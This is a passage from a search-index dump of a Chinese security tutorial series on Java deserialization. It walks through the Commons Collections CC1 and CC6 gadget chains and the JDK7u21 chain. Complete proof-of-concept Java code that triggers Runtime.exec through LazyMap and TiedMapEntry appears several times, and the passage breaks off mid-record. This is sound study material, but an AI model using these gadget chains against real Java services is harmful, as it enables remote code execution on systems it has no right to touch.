Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ); Constructor constructor = clazz . getDeclaredConstructor ( Class . class , Map . class ); constructor . setAccessible ( true ); InvocationHandler handler = ( InvocationHandler ) constructor . newInstance ( Retention . class , outerMap ); Map proxyMap = ( Map ) Proxy . newProxyInstance ( Map . class . getClassLoader (), new Class [] { Map . class }, handler ); handler = ( InvocationHandler ) constructor . newInstance ( Retention . class , proxyMap ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( handler ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } }","title":"java\u5bf9\u8c61\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/#\u603b\u7ed3","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc76 # CC6 # \u53cd\u5e8f\u5217\u5316\u7bc75\u63d0\u5230\u4e86CC1\u94fe\u5728java8\u9ad8\u7248\u672c\u5e76\u4e0d\u9002\u7528\uff0c\u5f53\u6211\u4eec\u53bb\u5c1d\u8bd5\uff0c\u4f1a\u4ea7\u751f\u62a5\u9519: java.lang.annotation.Retention missing element entrySet \u3002 \u8fd9\u662f\u7531\u4e8e AnnotationInvocationHandler \u5728\u9ad8\u7248\u672c\u4e2d\u6539\u53d8\u4e86readObject\u7684\u903b\u8f91\uff0c\u4e0d\u518d\u4f7f\u7528\u6211\u4eec\u7cbe\u5fc3\u6784\u9020\u7684 LazyMap \u800c\u662f\u4f7f\u7528\u81ea\u5df1\u65b0\u5efa\u7684 LinkedHashMap \uff0c\u5bfc\u81f4\u8be5\u5bf9\u8c61\u65e0\u6cd5\u83b7\u5f97 entrySet \u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u4f1a\u62a5\u524d\u9762\u7684\u8fd9\u4e2a\u9519\u8bef\u3002 \u4e3a\u4e86\u89e3\u51b3\u9ad8\u7248\u672c\u7684\u5229\u7528\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u6784\u9020\u94fe\u7684\u524d\u534a\u90e8\u5206\uff0c\u5bfb\u627e\u662f\u5426\u6709\u5176\u4ed6\u5730\u65b9\u80fd\u591f\u8c03\u7528 LazyMap.get() \u65b9\u6cd5\u3002 \u627e\u5230\u7684\u5730\u65b9\u662f org.apache.commons.collections.keyvalue.TiedMapEntry \uff0c\u5728\u5176 getValue \u65b9\u6cd5\u4e2d\u8c03\u2f64\u4e86 this.map.get \uff0c\u800c\u5176 hashCode \uff0c toString \uff0c equals \u65b9\u6cd5\u90fd\u8c03\u7528\u4e86\u81ea\u8eab\u7684 getValue \u65b9\u6cd5\u3002 import org.apache.commons.collections.KeyValue ; public class TiedMapEntry implements Entry , KeyValue , Serializable { private static final long serialVersionUID = - 8453869361373831205L ; private final Map map ; private final Object key ; public TiedMapEntry ( Map map , Object key ) { this . map = map ; this . key = key ; } public Object getKey () { return this . key ; } public Object getValue () { return this . map . get ( this . key ); } // ... public int hashCode () { Object value = this . getValue (); return ( this . getKey () == null ? 0 : this . getKey (). hashCode ()) ^ ( value == null ? 0 : value . hashCode ()); } // ... } \u5728ysoserial\u4e2d\uff0c\u662f\u5229\u7528\u4e86 java.util.HashSet.readObject() -> HashMap.put() -> HashMap.hash(key) -> TiedMapEntry.hashCode() \u3002 \u800c\u5b9e\u9645\u4e0a\uff0c\u5728 java.util.HashMap.readObject() \u5c31\u6709 hash(key) \u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u6784\u9020gadget\u3002 \u6784\u9020gadget # \u6784\u9020\u7684\u65f6\u5019\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\uff0c\u5148\u521b\u5efa\u4e86\u4e00\u4e2afakeTransformers\uff0c\u5728\u5e8f\u5217\u5316\u7684\u524d\u4e00\u523b\u624d\u5c06\u5176\u66ff\u6362\u4e3a\u771f\u6b63\u7684Transformers\uff0c\u8fd9\u6837\u80fd\u591f\u9632\u6b62\u6211\u4eec\u5728\u751f\u6210poc\u65f6\u7684\u672c\u5730\u547d\u4ee4\u6267\u884c\u3002 import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC6 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); Map objMap = new HashMap (); objMap . put ( tiedMapEntry , \"valuevalue\" ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( objMap ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u5f53\u6211\u4eec\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u53cd\u5e8f\u5217\u5316\u65f6\u5e76\u6ca1\u6709\u5f39\u51fa\u6765\u8ba1\u7b97\u5668! \u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \u4e3a\u4ec0\u4e48\u6ca1\u6709\u6210\u529f\u6267\u884c # \u6211\u4eec\u5c1d\u8bd5\u5728 LazyMap.get \u65b9\u6cd5\u4e2d\u4e0b\u4e00\u4e2a\u65ad\u70b9\u8c03\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u95ee\u9898: \u6211\u4eec\u5728\u6784\u9020gadget\u7684\u65f6\u5019\u5c31\u89e6\u53d1\u4e86 LazyMap.get \u65b9\u6cd5\uff0c\u5bfc\u81f4 LazyMap \u7684\u5047\u5229\u7528\u94fe\u88ab\u63d0\u524d\u89e6\u53d1\uff0c\u800c\u5f53\u6211\u4eec\u771f\u6b63\u60f3\u8981\u53bb\u53cd\u5e8f\u5217\u5316\u65f6\uff0cLazyMap\u5df2\u7ecf\u5b58\u5728 keykey \u8fd9\u4e2a\u952e\uff0c\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u8fdb\u5165 this.factory.transfrom \u8fd9\u4e2a\u8bed\u53e5\u89e6\u53d1\u6211\u4eec\u771f\u6b63\u7684\u5229\u7528\u94fe\uff0c\u4f46\u662f\u6211\u4eec\u5e76\u6ca1\u6709\u53bb\u624b\u52a8\u8c03\u7528 LazyMap.get \uff0c\u4e3a\u4ec0\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u89e6\u53d1\u5462\uff1f \u6211\u4eec\u56de\u987e\u6e90\u7801\uff0c\u53ea\u6709\u5728 TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"keykey\"); \u8fd9\u53e5\u8bdd\u4e2d\u5b58\u5728keykey\uff0c\u5f53\u6211\u4eec\u53bb\u67e5\u770b HashMap.put \u65b9\u6cd5\u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u7f6a\u9b41\u7978\u9996: \u5f53\u6211\u4eec\u6784\u9020gadget\u65f6\u4f1a\u5c06 TiedMapEntry \u624b\u52a8put\u5230HashMap\uff0c\u5bfc\u81f4\u5176\u89e6\u53d1\u4e86 hash(key) -> TiedMapEntry.hashCode() -> TiedMapEntry.getValue() \u63d0\u524d\u89e6\u53d1\u4e86\u6211\u4eec\u7684\u94fe\uff0c\u5e76\u4e14\u5c06\u8be5key\u5b58\u5165\u4e86 outerMap \uff0c\u4e0b\u6b21\u6211\u4eec\u771f\u6b63\u5229\u7528\u65f6\u7531\u4e8e outerMap \u5df2\u7ecf\u5b58\u5728\u8be5key\u800c\u5bfc\u81f4\u5229\u7528\u94fe\u5931\u8d25! \u4e86\u89e3\u4e86\u539f\u56e0\u4e4b\u540e\u6211\u4eec\u5c31\u5f88\u597d\u89e3\u51b3\u8be5\u95ee\u9898\u4e86: \u5728 objMap.put \u4e4b\u540e\u8c03\u7528 outerMap.remove \u5220\u9664\u8be5key\u5373\u53ef\u3002 \u6700\u7ec8poc # import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC6 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); Map objMap = new HashMap (); objMap . put ( tiedMapEntry , \"valuevalue\" ); outerMap . remove ( \"keykey\" ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( objMap ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u603b\u7ed3 # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: HashMap.readObject() hash(key) === key.hashCode() === TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u53cd\u5e8f\u5217\u5316\u7bc76"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/#\u53cd\u5e8f\u5217\u5316\u7bc76","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc76"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/#cc6","text":"\u53cd\u5e8f\u5217\u5316\u7bc75\u63d0\u5230\u4e86CC1\u94fe\u5728java8\u9ad8\u7248\u672c\u5e76\u4e0d\u9002\u7528\uff0c\u5f53\u6211\u4eec\u53bb\u5c1d\u8bd5\uff0c\u4f1a\u4ea7\u751f\u62a5\u9519: java.lang.annotation.Retention missing element entrySet \u3002 \u8fd9\u662f\u7531\u4e8e AnnotationInvocationHandler \u5728\u9ad8\u7248\u672c\u4e2d\u6539\u53d8\u4e86readObject\u7684\u903b\u8f91\uff0c\u4e0d\u518d\u4f7f\u7528\u6211\u4eec\u7cbe\u5fc3\u6784\u9020\u7684 LazyMap \u800c\u662f\u4f7f\u7528\u81ea\u5df1\u65b0\u5efa\u7684 LinkedHashMap \uff0c\u5bfc\u81f4\u8be5\u5bf9\u8c61\u65e0\u6cd5\u83b7\u5f97 entrySet \u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u4f1a\u62a5\u524d\u9762\u7684\u8fd9\u4e2a\u9519\u8bef\u3002 \u4e3a\u4e86\u89e3\u51b3\u9ad8\u7248\u672c\u7684\u5229\u7528\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u6784\u9020\u94fe\u7684\u524d\u534a\u90e8\u5206\uff0c\u5bfb\u627e\u662f\u5426\u6709\u5176\u4ed6\u5730\u65b9\u80fd\u591f\u8c03\u7528 LazyMap.get() \u65b9\u6cd5\u3002 \u627e\u5230\u7684\u5730\u65b9\u662f org.apache.commons.collections.keyvalue.TiedMapEntry \uff0c\u5728\u5176 getValue \u65b9\u6cd5\u4e2d\u8c03\u2f64\u4e86 this.map.get \uff0c\u800c\u5176 hashCode \uff0c toString \uff0c equals \u65b9\u6cd5\u90fd\u8c03\u7528\u4e86\u81ea\u8eab\u7684 getValue \u65b9\u6cd5\u3002 import org.apache.commons.collections.KeyValue ; public class TiedMapEntry implements Entry , KeyValue , Serializable { private static final long serialVersionUID = - 8453869361373831205L ; private final Map map ; private final Object key ; public TiedMapEntry ( Map map , Object key ) { this . map = map ; this . key = key ; } public Object getKey () { return this . key ; } public Object getValue () { return this . map . get ( this . key ); } // ... public int hashCode () { Object value = this . getValue (); return ( this . getKey () == null ? 0 : this . getKey (). hashCode ()) ^ ( value == null ? 0 : value . hashCode ()); } // ... } \u5728ysoserial\u4e2d\uff0c\u662f\u5229\u7528\u4e86 java.util.HashSet.readObject() -> HashMap.put() -> HashMap.hash(key) -> TiedMapEntry.hashCode() \u3002 \u800c\u5b9e\u9645\u4e0a\uff0c\u5728 java.util.HashMap.readObject() \u5c31\u6709 hash(key) \u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u6784\u9020gadget\u3002","title":"CC6"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/#\u6784\u9020gadget","text":"\u6784\u9020\u7684\u65f6\u5019\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\uff0c\u5148\u521b\u5efa\u4e86\u4e00\u4e2afakeTransformers\uff0c\u5728\u5e8f\u5217\u5316\u7684\u524d\u4e00\u523b\u624d\u5c06\u5176\u66ff\u6362\u4e3a\u771f\u6b63\u7684Transformers\uff0c\u8fd9\u6837\u80fd\u591f\u9632\u6b62\u6211\u4eec\u5728\u751f\u6210poc\u65f6\u7684\u672c\u5730\u547d\u4ee4\u6267\u884c\u3002 import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC6 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); Map objMap = new HashMap (); objMap . put ( tiedMapEntry , \"valuevalue\" ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( objMap ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u5f53\u6211\u4eec\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u53cd\u5e8f\u5217\u5316\u65f6\u5e76\u6ca1\u6709\u5f39\u51fa\u6765\u8ba1\u7b97\u5668! \u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f","title":"\u6784\u9020gadget"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/#\u4e3a\u4ec0\u4e48\u6ca1\u6709\u6210\u529f\u6267\u884c","text":"\u6211\u4eec\u5c1d\u8bd5\u5728 LazyMap.get \u65b9\u6cd5\u4e2d\u4e0b\u4e00\u4e2a\u65ad\u70b9\u8c03\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u95ee\u9898: \u6211\u4eec\u5728\u6784\u9020gadget\u7684\u65f6\u5019\u5c31\u89e6\u53d1\u4e86 LazyMap.get \u65b9\u6cd5\uff0c\u5bfc\u81f4 LazyMap \u7684\u5047\u5229\u7528\u94fe\u88ab\u63d0\u524d\u89e6\u53d1\uff0c\u800c\u5f53\u6211\u4eec\u771f\u6b63\u60f3\u8981\u53bb\u53cd\u5e8f\u5217\u5316\u65f6\uff0cLazyMap\u5df2\u7ecf\u5b58\u5728 keykey \u8fd9\u4e2a\u952e\uff0c\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u8fdb\u5165 this.factory.transfrom \u8fd9\u4e2a\u8bed\u53e5\u89e6\u53d1\u6211\u4eec\u771f\u6b63\u7684\u5229\u7528\u94fe\uff0c\u4f46\u662f\u6211\u4eec\u5e76\u6ca1\u6709\u53bb\u624b\u52a8\u8c03\u7528 LazyMap.get \uff0c\u4e3a\u4ec0\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u89e6\u53d1\u5462\uff1f \u6211\u4eec\u56de\u987e\u6e90\u7801\uff0c\u53ea\u6709\u5728 TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"keykey\"); \u8fd9\u53e5\u8bdd\u4e2d\u5b58\u5728keykey\uff0c\u5f53\u6211\u4eec\u53bb\u67e5\u770b HashMap.put \u65b9\u6cd5\u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u7f6a\u9b41\u7978\u9996: \u5f53\u6211\u4eec\u6784\u9020gadget\u65f6\u4f1a\u5c06 TiedMapEntry \u624b\u52a8put\u5230HashMap\uff0c\u5bfc\u81f4\u5176\u89e6\u53d1\u4e86 hash(key) -> TiedMapEntry.hashCode() -> TiedMapEntry.getValue() \u63d0\u524d\u89e6\u53d1\u4e86\u6211\u4eec\u7684\u94fe\uff0c\u5e76\u4e14\u5c06\u8be5key\u5b58\u5165\u4e86 outerMap \uff0c\u4e0b\u6b21\u6211\u4eec\u771f\u6b63\u5229\u7528\u65f6\u7531\u4e8e outerMap \u5df2\u7ecf\u5b58\u5728\u8be5key\u800c\u5bfc\u81f4\u5229\u7528\u94fe\u5931\u8d25! \u4e86\u89e3\u4e86\u539f\u56e0\u4e4b\u540e\u6211\u4eec\u5c31\u5f88\u597d\u89e3\u51b3\u8be5\u95ee\u9898\u4e86: \u5728 objMap.put \u4e4b\u540e\u8c03\u7528 outerMap.remove \u5220\u9664\u8be5key\u5373\u53ef\u3002","title":"\u4e3a\u4ec0\u4e48\u6ca1\u6709\u6210\u529f\u6267\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/#\u6700\u7ec8poc","text":"import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC6 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); Map objMap = new HashMap (); objMap . put ( tiedMapEntry , \"valuevalue\" ); outerMap . remove ( \"keykey\" ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( objMap ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } }","title":"\u6700\u7ec8poc"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/#\u603b\u7ed3","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: HashMap.readObject() hash(key) === key.hashCode() === TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bJDK7u21 # \u611f\u89c9p\u725b\u7684\u6587\u7ae0\u5199\u7684\u975e\u5e38\u597d\uff0c\u5f88\u6e05\u6670\u5730\u628a7u21\u8fd9\u6761\u94fe\u7ed9\u8bb2\u4e86\u4e00\u904d(\u6bd4\u7f51\u4e0a\u641c\u5230\u7684\u51e0\u7bc7\u6587\u7ae0\u90fd\u8bb2\u7684\u660e\u767d\u5f97\u591a)\uff0c\u8fd9\u91cc\u8ddf\u7740p\u725b\u518d\u590d\u73b0\u4e00\u904d\u3002 AnnotationInvocationHandler#equalsImpl # JDK7u21\u7684\u4e3b\u8981\u6838\u5fc3\u5728\u4e8e AnnotationInvocationHandler#equalsImpl \uff0c\u4ee3\u7801\u5982\u4e0b: private Boolean equalsImpl ( Object var1 ) { if ( var1 == this ) { return true ; } else if ( ! this . type . isInstance ( var1 )) { return false ; } else { Method [] var2 = this . getMemberMethods (); int var3 = var2 . length ; for ( int var4 = 0 ; var4 < var3 ; ++ var4 ) { Method var5 = var2 [ var4 ] ; String var6 = var5 . getName (); Object var7 = this . memberValues . get ( var6 ); Object var8 = null ; AnnotationInvocationHandler var9 = this . asOneOfUs ( var1 ); if ( var9 != null ) { var8 = var9 . memberValues . get ( var6 ); } else { try { var8 = var5 . invoke ( var1 ); } catch ( InvocationTargetException var11 ) { return false ; } catch ( IllegalAccessException var12 ) { throw new AssertionError ( var12 ); } } if ( ! memberValueEquals ( var7 , var8 )) { return false ; } } return true ; } } private Method [] getMemberMethods () { if ( this . memberMethods == null ) { this . memberMethods = ( Method [] ) AccessController . doPrivileged ( new PrivilegedAction < Method []> () { public Method [] run () { Method [] var1 = AnnotationInvocationHandler . this . type . getDeclaredMethods (); AccessibleObject . setAccessible ( var1 , true ); return var1 ; } }); } return this . memberMethods ; } \u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u6709\u4e2a\u5f88\u660e\u663e\u7684\u53cd\u5c04\u8c03\u7528 memberMethod.invoke(o) \uff0c\u800cmemberMethod\u6765\u81ea\u4e8e this.type.getDeclaredMethods() \u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c equalsImpl \u8fd9\u4e2a\u65b9\u6cd5\u662f\u5c06this.type\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u904d\u5386\u5e76\u6267\u884c\u4e86\u3002\u90a3\u4e48\uff0c\u5047\u8bbe this.type\u662f Templates \u7c7b\uff0c\u5219\u52bf\u5fc5\u4f1a\u8c03\u7528\u5230\u5176\u4e2d\u7684 newTransformer \u6216 getOutputProperties \u65b9\u6cd5\uff0c\u800c\u8fd9\u4e9b\u65b9\u6cd5\u6700\u7ec8\u90fd\u4f1a\u89e6\u53d1\u4efb\u610fjava\u4ee3\u7801\u6267\u884c: public interface Templates { Transformer newTransformer () throws TransformerConfigurationException ; Properties getOutputProperties (); } AnnotationInvocationHandler#invoke # \u90a3\u4e48\u6211\u4eec\u8981\u5982\u4f55\u8c03\u7528\u5230 equalsImpl \u65b9\u6cd5\u5462\uff1fequalsImpl\u662f\u4e00\u4e2a\u79c1\u6709\u65b9\u6cd5\uff0c\u5728 AnnotationInvocationHandler#invoke \u4e2d\u88ab\u8c03\u7528\u3002 public Object invoke ( Object var1 , Method var2 , Object [] var3 ) { String var4 = var2 . getName (); Class [] var5 = var2 . getParameterTypes (); if ( var4 . equals ( \"equals\" ) && var5 . length == 1 && var5 [ 0 ] == Object . class ) { return this . equalsImpl ( var3 [ 0 ] ); } else { assert var5 . length == 0 ; if ( var4 . equals ( 